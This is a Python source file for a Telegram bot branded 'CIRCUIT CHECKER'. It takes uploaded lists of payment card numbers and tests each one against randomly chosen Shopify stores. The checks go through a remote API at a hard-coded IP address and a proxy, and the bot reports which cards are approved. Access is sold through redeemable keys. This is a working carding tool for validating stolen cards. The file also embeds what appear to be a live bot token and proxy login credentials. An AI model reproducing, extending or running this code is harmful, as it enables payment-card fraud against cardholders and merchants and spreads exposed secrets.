import requests, time, threading, random
import telebot
from hh import keep_alive

bot = telebot.TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU", parse_mode="HTML")
OWNER_ID = 7077294261

API_BASE = "http://108.165.12.183:8081/"

sites = [
    "https://customsbyarrillc.myshopify.com",
    "https://yourstore.myshopify.com",
    "https://anotherstore.myshopify.com",
    # Add more Shopify sites here
]

@bot.message_handler(commands=["start"])
def welcome(message):
    bot.send_message(message.chat.id, "<b>🔥 CIRCUIT CHECKER 🔥</b>\nMulti Site Mode", parse_mode="HTML")

@bot.message_handler(commands=["key"])
def redeem_key(message):
    try:
        key = message.text.split()[1]
        if key in {"B3-2026-PREMIUM", "SONALI123", "FREE2026", "GATEAU2026"}:
            # Add user to allowed
            bot.reply_to(message, "✅ Key Activated!")
        else:
            bot.reply_to(message, "❌ Invalid Key!")
    except:
        bot.reply_to(message, "Usage: /key YOURKEY")

@bot.message_handler(content_types=["document"])
def check(message):
    # ... (same auth)

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open("combo.txt", "wb") as f: f.write(downloaded)

    with open("combo.txt") as f:
        cards = [line.strip() for line in f if line.strip()]

    approved = declined = 0
    total = len(cards)

    status = bot.reply_to(message, f"""
<b>🔥 CIRCUIT CHECKER 🔥</b>

Multi Site Checking...
━━━━━━━━━━━━━━
✅ Approved: 0
❌ Declined: 0
📊 Total: {total}
    """, parse_mode="HTML")

    def worker(cc):
        nonlocal approved, declined
        site = random.choice(sites)  # Random site for each card
        try:
            url = f"{API_BASE}?{cc}&url={site}&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
            resp = requests.get(url, timeout=30).json()

            if resp.get("Approved") == "True":
                approved += 1
                bot.reply_to(message, f"✅ APPROVED\nCC: <code>{cc}</code>\nSite: {site}")
            else:
                declined += 1

            bot.edit_message_text(f"""
<b>🔥 CIRCUIT CHECKER 🔥</b>

Multi Site...
━━━━━━━━━━━━━━
✅ Approved: {approved}
❌ Declined: {declined}
📊 Total: {total}
            """, message.chat.id, status.message_id, parse_mode="HTML")

        except:
            declined += 1

    for cc in cards:
        threading.Thread(target=worker, args=(cc,)).start()
        time.sleep(1.5)

    bot.reply_to(message, "✅ Checking Complete!")

keep_alive()
print("✅ Multi Site Bot Started")
bot.infinity_polling()
